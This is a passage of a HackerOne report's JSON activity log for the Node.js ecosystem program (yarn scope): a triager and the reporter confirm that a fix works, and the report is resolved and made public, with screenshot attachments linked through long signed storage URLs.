%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=13964f89182cd01a0439ec6b6b0ea3b7ba7dfef7fe15e0677c7b76f2a3eb6d45\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CPvjSk5gW5fXFF6HGc2iMd56?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.26.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.26.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064259Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=13964f89182cd01a0439ec6b6b0ea3b7ba7dfef7fe15e0677c7b76f2a3eb6d45\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e do you think a correct fix has been implemented?\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T11:04:26.832Z","updated_at":"2020-02-06T11:04:26.832Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"attachments":[{"id":707842,"filename":"Screenshot_2020-02-06_at_12.03.26.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CPvjSk5gW5fXFF6HGc2iMd56?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.26.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.26.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064259Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=13964f89182cd01a0439ec6b6b0ea3b7ba7dfef7fe15e0677c7b76f2a3eb6d45"},{"id":707841,"filename":"Screenshot_2020-02-06_at_12.03.16.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/W25D3yJd7aREuMkF3GtqCrPT?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.16.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064259Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=592bc714c3e8ee9c87fd0eb15c436c6840b8d5869e7414e51ae6c90901d71a17"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6985239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, looks like it is fixed. I will proceed with disclosure.","markdown_message":"\u003cp\u003eThanks, looks like it is fixed. I will proceed with disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-07T08:57:50.858Z","updated_at":"2020-02-07T08:57:50.858Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6985244,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T08:58:02.703Z","updated_at":"2020-02-07T08:58:02.703Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"rhyselsmore","url":"/rhyselsmore"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6985245,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T08:58:09.590Z","updated_at":"2020-02-07T08:58:09.590Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7057829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\n\nI'm so sorry, for some reason these emails were going to my spam. I think I fat fingered something in Gmail.\n\nI have checked this out, and it looks like the fix has remediated this issue. Please let me know if you need anything else :)\n\nCheers,\nRhys","markdown_message":"\u003cp\u003eHi team,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m so sorry, for some reason these emails were going to my spam. I think I fat fingered something in Gmail.\u003c/p\u003e\n\n\u003cp\u003eI have checked this out, and it looks like the fix has remediated this issue. Please let me know if you need anything else :)\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nRhys\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-15T00:33:26.226Z","updated_at":"2020-02-15T00:33:26.226Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7057831,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-15T00:33:41.213Z","updated_at":"2020-02-15T00:33:41.213Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7057832,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-15T00:33:41.279Z","updated_at":"2020-02-15T00:33:41.279Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9573565,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-20T09:23:09.956Z","updated_at":"2020-10-20T09:23:09.956Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"yarn","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}